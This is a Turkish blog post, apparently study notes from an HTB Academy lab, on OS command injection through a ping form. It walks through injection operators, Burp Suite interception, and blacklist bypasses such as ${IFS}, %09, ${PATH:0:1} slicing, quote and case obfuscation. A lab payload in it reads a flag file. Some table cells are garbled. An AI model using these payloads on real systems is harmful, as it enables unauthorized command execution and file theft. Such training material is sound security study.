@@ -1,0 +1,336 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>Command Injections | fhk0</title><meta name="author" content="fhk0"><meta name="copyright" content="fhk0"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Tespit Bu tarz alanlarda komut enjeksiyonu olabilir. Örneğin yukarıdaki işlem IP adresi girmemizi istiyor ve host’u check ediyor. Yani oraya bir ping yaptığını söyleyebiliriz. Ping’in bir OS komutu ol">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Command Injections">
+<meta property="og:url" content="https://fhk0.github.io/2022/09/16/Command-Injections/index.html">
+<meta property="og:site_name" content="fhk0">
+<meta property="og:description" content="Tespit Bu tarz alanlarda komut enjeksiyonu olabilir. Örneğin yukarıdaki işlem IP adresi girmemizi istiyor ve host’u check ediyor. Yani oraya bir ping yaptığını söyleyebiliriz. Ping’in bir OS komutu ol">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://fhk0.github.io/img/content-images/htb-academy/Command%20Injections%20d3aee23e20f34044aeb0f5435fb74972/commandinjection.jpg">
+<meta property="article:published_time" content="2022-09-16T05:23:52.000Z">
+<meta property="article:modified_time" content="2022-09-16T05:57:51.188Z">
+<meta property="article:author" content="fhk0">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://fhk0.github.io/img/content-images/htb-academy/Command%20Injections%20d3aee23e20f34044aeb0f5435fb74972/commandinjection.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://fhk0.github.io/2022/09/16/Command-Injections/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Command Injections',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-09-16 08:57:51'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.2.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/mrrobot.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">18</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">5</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/whoami/"><i class="fa-fw fa-solid fa-circle-user"></i><span> About</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/content-images/htb-academy/Command%20Injections%20d3aee23e20f34044aeb0f5435fb74972/commandinjection.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">fhk0</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/whoami/"><i class="fa-fw fa-solid fa-circle-user"></i><span> About</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Command Injections</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2022-09-16T05:23:52.000Z" title="Created 2022-09-16 08:23:52">2022-09-16</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2022-09-16T05:57:51.188Z" title="Updated 2022-09-16 08:57:51">2022-09-16</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/HTB-Academy/">HTB Academy</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/HTB-Academy/Bug-Bounty-Hunter/">Bug Bounty Hunter</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Command Injections"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Tespit"><a href="#Tespit" class="headerlink" title="Tespit"></a>Tespit</h1><p><img src="/img/content-images/htb-academy/Command%20Injections%20d3aee23e20f34044aeb0f5435fb74972/Untitled.png" alt="Untitled"></p>
+<p>Bu tarz alanlarda komut enjeksiyonu olabilir. Örneğin yukarıdaki işlem IP adresi girmemizi istiyor ve host’u check ediyor. Yani oraya bir ping yaptığını söyleyebiliriz. Ping’in bir OS komutu olduğunu düşünürsek, eğer burada yeterli önlem alınmadıysa o zaman buraya kendi komutlarımızı yerleştirebiliriz. İşte buna <code>command injection</code> denir. </p>
+<p>Kendi komutumuzu eklemek için bir önceki komutu bir nevi noktalamamız gerekir. Bunun için aşağıdaki tablodaki karakterlerden yararlanabiliriz:</p>
+<table>
+<thead>
+<tr>
+<th>Injection Operator</th>
+<th>Injection Character</th>
+<th>URL-Encoded Character</th>
+<th>Executed Command</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Semicolon</td>
+<td>;</td>
+<td>%3b</td>
+<td>Both</td>
+</tr>
+<tr>
+<td>New Line</td>
+<td>\n</td>
+<td>%0a</td>
+<td>Both</td>
+</tr>
+<tr>
+<td>Background</td>
+<td>&amp;</td>
+<td>%26</td>
+<td>Both (second output generally shown first)</td>
+</tr>
+<tr>
+<td>Pipe</td>
+<td></td>
+<td></td>
+<td>%7c</td>
+</tr>
+<tr>
+<td>AND</td>
+<td>&amp;&amp;</td>
+<td>%26%26</td>
+<td>Both (only if first succeeds)</td>
+</tr>
+<tr>
+<td>OR</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>Sub-Shell</td>
+<td>&#96;&#96;</td>
+<td>%60%60</td>
+<td>Both (Linux-only)</td>
+</tr>
+<tr>
+<td>Sub-Shell</td>
+<td>$()</td>
+<td>%24%28%29</td>
+<td>Both (Linux-only)</td>
+</tr>
+</tbody></table>
+<p>Bu operatörlerden herhangi birini başka bir komut enjekte etmek için kullanabiliriz, böylece komutlardan ikisi (daha önceki yazılan ve bizim şimdi yazdığımız) veya herhangi biri yürütülür. </p>
+<div class="note info flat"><p>🌐 <strong>Tip:</strong> In addition to the above, there are a few unix-only operators, that would work on Linux and macOS, but would not work on Windows, such as wrapping our injected command with double backticks (&#96;&#96;&#96;&#96;) or with a sub-shell operator (<code>$()</code>).</p>
+</div>
+
+<p>Genel olarak, temel komut enjeksiyonu için, web uygulaması dili, framework’ü veya back-end sunucusundan bağımsız olarak bu operatörlerin tümü komut enjeksiyonları için kullanılabilir. Bu nedenle, ister Linux sunucusunda çalışan bir PHP web uygulamasına, ister bir Windows arka uç sunucusunda çalışan bir .Net web uygulamasına ya da ister macOS arka uç sunucusunda çalışan bir NodeJS web uygulamasına enjekte ediyor olalım, ne olursa olsun enjeksiyonlarımız çalışmalıdır. </p>
+<div class="note info flat"><p>🌐 <strong>Note:</strong> The only exception may be the semi-colon <code>;</code>, which will not work if the command was being executed with <code>Windows Command Line (CMD)</code>, but would still work if it was being executed with <code>Windows PowerShell</code>.</p>
+</div>
+
+<h3 id="Yahu-Kardesim-Ben-Yaziyorum-Komutu-Bu-Diyor-Ki-Benim-Tipime-Gore-Degilsin-E-Napicaz-O-Zaman"><a href="#Yahu-Kardesim-Ben-Yaziyorum-Komutu-Bu-Diyor-Ki-Benim-Tipime-Gore-Degilsin-E-Napicaz-O-Zaman" class="headerlink" title="Yahu Kardeşim Ben Yazıyorum Komutu Bu Diyor Ki Benim Tipime Göre Değilsin E Napıcaz O Zaman?"></a>Yahu Kardeşim Ben Yazıyorum Komutu Bu Diyor Ki Benim Tipime Göre Değilsin E Napıcaz O Zaman?</h3><p><img src="/img/content-images/htb-academy/Command%20Injections%20d3aee23e20f34044aeb0f5435fb74972/Untitled%201.png" alt="Untitled"></p>
+<p>Diyor ki istenen formata göre yaz. Orada sadece bir IP adresi olsun istiyor. Bu vesileyle <code>; whoami</code> kısmını kabul etmiyor. Hmm peki bu engelleme front-end tarafında mı yoksa back-end tarafında mı?</p>
+<p><img src="/img/content-images/htb-academy/Command%20Injections%20d3aee23e20f34044aeb0f5435fb74972/Untitled%202.png" alt="Untitled"></p>
+<p>Dev tool’u açıp tekrardan check ettiğimizde network panelinde herhangi bir giden gelen bir istek olmadığını görüyoruz yani bu <strong>back-end tarafı ile herhangi bir temas kurulmadığı</strong> manasına gelir. Sonuç olarak bu kontrol işlemi front-end kısımda yapılmıştır. O zaman bunu bypass etmek çok daha kolaydır. <strong>Burpsuiteeee</strong> gel kardeşim. </p>
+<p><img src="/img/content-images/htb-academy/Command%20Injections%20d3aee23e20f34044aeb0f5435fb74972/Untitled%203.png" alt="Untitled"></p>
+<p>Front-end tarafta racona uygun yazarken bunu burp suite ile yakalayıp ilgili kısımda değişiklik yapıyorum:</p>
+<p><img src="/img/content-images/htb-academy/Command%20Injections%20d3aee23e20f34044aeb0f5435fb74972/Untitled%204.png" alt="Untitled"></p>
+<p><code>www-data</code> olduğumuz sonucunu sistem bize döndürdü. Bu sayede komutumuzu enjekte etmiş olduk.</p>
+<h1 id="Filtrelemeler-ve-Kara-Listeler"><a href="#Filtrelemeler-ve-Kara-Listeler" class="headerlink" title="Filtrelemeler ve Kara Listeler"></a>Filtrelemeler ve Kara Listeler</h1><p>Bir sitede php kodu olarak bir blacklist varsa muhtemelen şöyle bir şeydir:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$blacklist</span> = [<span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;|&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, ...SNIP...];</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$character</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ip&#x27;</span>], <span class="variable">$character</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Invalid input&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Eğer gönderdiğimiz herhangi bir karakter bu kara listenin içerisinde varsa o zaman invalid input şeklinde bir cevap alacağızdır.</p>
+<p>Şimdi diyelim ki biz kara listeye alınmamış bir karakter bulduk güzel. Ancak başlı başına önem taşıyan boşluk (space tuşuna basınca oluşan şey) engellenmiş. E peki ben bu durumdan nasıl kurtulacağım? <code>Tab</code> kullanabilirsin 😈 Tab ile dört boşluk kadar ileri gidersin ve bunu <code>%09</code> URL kodlamasıyla yapabilirsin.</p>
+<p><img src="/img/content-images/htb-academy/Command%20Injections%20d3aee23e20f34044aeb0f5435fb74972/Untitled%205.png" alt="Untitled"></p>
+<p>Yukarıda görüldüğü üzere önce new line <code>(%0a)</code> ve sonrasında tab <code>(%09)</code> kullandık ve sonuç olarak ping sonucunu yine elde etmiş olduk. Böylece başarıyla space filtrelemesini yanıltmış olduk.</p>
+<p><strong>Abim başka güzel yöntemin var mı?</strong> Olmaz mı be güzel kardeşim. Bak elimde Linux Environment Variable denen bir şey var. Linux Environment Variable, <code>$&#123;IFS&#125;</code> kullanım şekli ile birlikte terminal komutu yazarmış gibi komutlar girmemizi sağlar. <code>$&#123;IFS&#125;</code> ’in varsayılan değeri boşluktur. Yani bu <code>$&#123;IFS&#125;</code> ’nin olduğu yerin boşluk olacağı anlamına gelir. Örnek yapalım:</p>
+<p><img src="/img/content-images/htb-academy/Command%20Injections%20d3aee23e20f34044aeb0f5435fb74972/Untitled%206.png" alt="Untitled"></p>
+<p>Yukarıda da görüldüğü üzere <code>$&#123;IFS&#125;</code> görevi görmüştür ve ping sonucu sistem tarafından bize döndürülmüştür.</p>
+<p><strong>Güzel peki ben bu IFS yerine başka bir şey yazabilir miyim?</strong> Evet yazabiliriz mesela içerisine linux komutları yerleştirebiliriz: <code>$&#123;ls,-la&#125;</code> şeklindeki kullanımına bir bakalım. Tabii bu sefer yazarken başına <code>$</code> işareti koymuyoruz:</p>
+<p><img src="/img/content-images/htb-academy/Command%20Injections%20d3aee23e20f34044aeb0f5435fb74972/Untitled%207.png" alt="Untitled"></p>
+<p>Yukarıda da görüldüğü üzere değişken komutumuzu girdik ve sonuçlar bize döndü.</p>
+<p><strong>Kardeşim ben bir dizin belirtmek istiyorum ama bu <code>/</code> ve <code>\</code> işaretleri kara listeye alınmış ve ben bunları kullanamıyorum ne yapacağım?</strong></p>
+<p>Öncelikle Linux ortamında bir inceleme yapalım. Sen <code>PATH</code> variable nedir bilir misin evlat? Örneğine bir göz atalım:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;PATH&#125;</span></span><br><span class="line"></span><br><span class="line">/usr/local/bin:/usr/bin:/bin:/usr/games</span><br></pre></td></tr></table></figure>
+
+<p>Bak dizinler arasında <code>/</code> var. Peki python’da listelerden eleman seçmek gibi burada da yukarıdaki dizini bir liste olarak kabul edip ilk elemanı seçsen bu ne olurdu? Tabii ki <code>/</code> karakterini döndürmüş olurduk çünkü tüm dizin bu <code>/</code> karakteriyle başlıyor. Şimdi bunu gösterelim:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;PATH:0:1&#125;</span></span><br><span class="line"></span><br><span class="line">/</span><br></pre></td></tr></table></figure>
+
+<p>Görüldüğü üzere <code>:0:1</code> şeklinde bir ekleme yaptık, 0. indeksten başlamasını istedik ve yalnızca 1 karakteri bize döndürmesini istedik. Sonuç olarak da bize <code>/</code> karakteri dönmüş oldu. Bu konsepti başka karakterleri elde etmek için de kullanabiliriz. Örneğin şimdi <code>;</code> karakterini elde edelim:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;LS_COLORS:10:1&#125;</span></span><br><span class="line"></span><br><span class="line">;</span><br></pre></td></tr></table></figure>
+
+<p><strong>Peki tamam da bu LS_COLORS nasıl bir şey var mı bir şekli şemali?</strong> Var evet. <code>printenv</code> yazıp terminalde enter’ladığımız zaman bize tüm environment değişkenlerini döndürür. Bu dönen değişkenlerden birisi de LS_COLORS ‘dır. LS_COLORS&#x3D; kısmından sonra gelen her karakter yukarıda belirtilen örneklerde olduğu gibi elde edilebilir.</p>
+<p><img src="/img/content-images/htb-academy/Command%20Injections%20d3aee23e20f34044aeb0f5435fb74972/Untitled%208.png" alt="Untitled"></p>
+<p><strong>Peki bunu burp suite kullanırken payloadlarımızda kullanabilir miyiz? Evet!</strong> Direkt olarak yukarıda yazdığımız şekilde ancak <code>echo</code> barındırmayacak haliyle payloadımıza ekleriz. Şimdi  <code>127.0.0.1$&#123;LS_COLORS:10:1&#125;$&#123;IFS&#125;</code> şeklindeki yeni payloadımıza bir göz atalım.</p>
+<p><img src="/img/content-images/htb-academy/Command%20Injections%20d3aee23e20f34044aeb0f5435fb74972/Untitled%209.png" alt="Untitled"></p>
+<p>Görüldüğü üzere yine karakter filtrelemesini başarıyla atlatmış olduk. Benzer konsept windows terminalde ya da powershell üzerinde de uygulanabilir.</p>
+<h3 id="Character-Shifting"><a href="#Character-Shifting" class="headerlink" title="Character Shifting"></a>Character Shifting</h3><p>Filtrelemeler ve kara listelerden kurtulmak için bir başka teknik de karakter değiştirme yöntemidir. Bu sefer burada devreye ASCII karakterleri giriyor. Bize lazım olan karakterin ASCII değerinin bir eksiğindeki karakteri alıyoruz ve onun değerini shift’leyip (bir nevi onun değerini ittirip) onu bizim istediğimiz yeni karaktere dönüştürüyoruz. Örneğin bize <code>\</code> karakteri lazım ve bu karakterin ASCII değeri <code>92</code>. Bu doğrultuda biz ASCII değeri 91 olan karakteri gidip buluyoruz ve bu karakter de <code>[</code> ’dir. Sonrasında:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> $(<span class="built_in">tr</span> <span class="string">&#x27;!-&#125;&#x27;</span> <span class="string">&#x27;&quot;-~&#x27;</span>&lt;&lt;&lt;[)</span><br></pre></td></tr></table></figure>
+
+<p>Yukarıdaki şekilde kodumuzu yazıyoruz ve <code>\</code> karakterini elde ediyoruz.</p>
+<p><img src="/img/content-images/htb-academy/Command%20Injections%20d3aee23e20f34044aeb0f5435fb74972/Untitled%2010.png" alt="Untitled"></p>
+<p>İstediğimiz şekilde düzenleyebilmek için en sağdaki <code>[</code> karakterini değiştirmek yeterlidir.</p>
+<div class="note info flat"><p>🌐 <strong>Çok Önemli Not:</strong> Mutlaka ama mutlaka payload yazarken yeni satıra geç. Yani new-line, <code>%0a</code> karakterini kullan. Yoksa dönen cevabı göremeyebilirsin. Bunun bir örneği aşağıda yaşandı. %0a kullanmadan önce sadece ping yanıtını görebiliyordum. %0a kullandıktan sonra artık cevabı görebilir hale geldim.</p>
+<p><img src="/img/content-images/htb-academy/Command%20Injections%20d3aee23e20f34044aeb0f5435fb74972/Untitled%2011.png" alt="Untitled"></p>
+</div>
+
+<h2 id="Bypassing-Blacklisted-Commands"><a href="#Bypassing-Blacklisted-Commands" class="headerlink" title="Bypassing Blacklisted Commands"></a><strong><strong>Bypassing Blacklisted Commands</strong></strong></h2><p>Bu sefer de işin içine komut obfuscation giriyor. Bazı komutlar yasaklandığı zaman nasıl bypass edileceğini işte burada işleyeceğiz. Diyelim ki <code>whoami</code> komutunu kullanmak istiyoruz ancak bu komut kara listeye alınmış o zaman ne yapacağız? Kara liste şöyle bir şey olsun:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$blacklist</span> = [<span class="string">&#x27;whoami&#x27;</span>, <span class="string">&#x27;cat&#x27;</span>, ...SNIP...];</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$word</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="string">&#x27;$_POST[&#x27;</span>ip<span class="string">&#x27;]&#x27;</span>, <span class="variable">$word</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Invalid input&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Komutu biraz daha “farklı” bir biçimde gönderirsek o zaman komut bu filtreden geçebilir. Şimdi <strong>hem linux hem windowsta</strong> çalışan bir metoda göz atalım:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">21y4d@htb[/htb]$ w<span class="string">&#x27;h&#x27;</span>o<span class="string">&#x27;am&#x27;</span>i</span><br><span class="line"></span><br><span class="line">21y4d</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">21y4d@htb[/htb]$ w<span class="string">&quot;h&quot;</span>o<span class="string">&quot;am&quot;</span>i</span><br><span class="line"></span><br><span class="line">21y4d</span><br></pre></td></tr></table></figure>
+
+<p>Burada dikkat edilmesi gereken, eğer böyle bir kullanıma gidilecekse <strong>tırnak işaretleri aynı türden olmalı</strong> ve <strong>sayıları çift olmalıdır</strong>. Örneğin biz yukarıda 4’er tane kullandık. Kullanımına göz atacak olursak:</p>
+<p><img src="/img/content-images/htb-academy/Command%20Injections%20d3aee23e20f34044aeb0f5435fb74972/Untitled%2012.png" alt="Untitled"></p>
+<p>En sonda <code>www-data</code> şeklinde kullanıcı adının döndürüldüğünü gözükmektedir. </p>
+<p>Şimdi <strong>sadece Linux üzerinde</strong> işe yarayan bir uygulamaya göz atalım. Bash shell odaklı bu karakterler backslash (<code>\</code>) ve pozisyonel parametre karakteridir (<code>$@</code>). Burada karakterlerin çift sayıda olmasına gerek yoktur. Kullanımları aşağıdaki gibidir:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">who</span><span class="variable">$@ami</span></span><br><span class="line">w\ho\am\i</span><br></pre></td></tr></table></figure>
+
+<p>Şimdi de <strong>yalnızca windowsta işe yarayan</strong> kullanımlara bir göz atalım. Örnek olarak <code>^</code> karakteri kullanılabilir:</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\htb&gt; who^ami</span><br><span class="line"></span><br><span class="line"><span class="number">21</span>y4d</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p><strong>Küçük Bir Vaka Çalışması:</strong></p>
+<p><code>/home/1nj3c70r/flag.txt</code> dosyasını okumaya çalışalım. Bunun için şu şekilde bir paylaod girdim: <code>127.0.0.1$&#123;LS_COLORS:10:1&#125;%0ac&quot;a&quot;t$&#123;IFS&#125;$&#123;PATH:0:1&#125;home$&#123;PATH:0:1&#125;1nj3c70r$&#123;PATH:0:1&#125;flag.txt</code> Burada demek istenilen <code>127.0.0.1; (new-line) cat /home/1nj3c70r/flag.txt</code> demektir. Sonuç:</p>
+<p><img src="/img/content-images/htb-academy/Command%20Injections%20d3aee23e20f34044aeb0f5435fb74972/Untitled%2013.png" alt="Untitled"></p>
+<hr>
+<h2 id="Advanced-Command-Obfuscation"><a href="#Advanced-Command-Obfuscation" class="headerlink" title="Advanced Command Obfuscation"></a><strong><strong>Advanced Command Obfuscation</strong></strong></h2><h3 id="Case-Manipulation"><a href="#Case-Manipulation" class="headerlink" title="Case Manipulation"></a><strong><strong>Case Manipulation</strong></strong></h3><p>Burada harflerin büyük küçük olması ile ilgileneceğiz. Örneğin <code>whoami</code> komutunun <code>WHOAMI</code> ya da <code>WhOmAi</code> şeklinde yazılması gibi.</p>
+<p>Windows sistemlerdeki powershell ve cmd büyük küçük harfle duyarlı değildir. Yani bu komut ne şekilde yazılırsa yazılsın çalıştırılacağı anlamına gelir:</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; WhOaMi</span><br><span class="line"></span><br><span class="line">FHK0</span><br></pre></td></tr></table></figure>
+
+<p>Linux sistemlerde bash shell büyük küçük harfe duyarlıdır. Yani komutun bir harfinin bile farklı olması o komutun istenildiği gibi çalıştırılmayacağı anlamına gelir. Bu yüzden şimdi terminalde öyle bir komut yazalım ki bu büyük ve küçük harf barındıran komutumuzu yalnızca küçük harfe dönüştürsün -bunu tam da komut çalıştırılırken yapsın ki karşı tarafı manipüle edelim-.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FHK0@htb[/htb]$ $(<span class="built_in">tr</span> <span class="string">&quot;[A-Z]&quot;</span> <span class="string">&quot;[a-z]&quot;</span>&lt;&lt;&lt;<span class="string">&quot;WhOaMi&quot;</span>)</span><br><span class="line"></span><br><span class="line">FHK0</span><br></pre></td></tr></table></figure>
+
+<p>Yukarıdaki komut sayesinde tüm büyük harfleri küçük harflere dönüştürdük. Burada dikkat edilmesi gereken, eğer boşluk engellendiyse yukarıdaki komutun çalışmayacağıdır çünkü komut boşluklar içermektedir. Bunu önlemek için de yukardaki boşluklara daha önceden öğrendiğimiz <code>%09</code> diye kodladığımız <code>tab</code> atayabiliriz. Yine aynı amaçla kullanabileceğimiz bir komut:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(a=<span class="string">&quot;WhOaMi&quot;</span>;<span class="built_in">printf</span> %s <span class="string">&quot;<span class="variable">$&#123;a,,&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="Reversed-Commands"><a href="#Reversed-Commands" class="headerlink" title="Reversed Commands"></a><strong><strong>Reversed Commands</strong></strong></h3><p>Komutu tersten yazma işlemidir. Örneğin <code>whoami</code> ise <code>imaohw</code> şeklinde yazıp bunu komut anında değiştirmektir. Kolaylık olması açısından terminal üzerinde komutumuzu tersine çevirelim:</p>
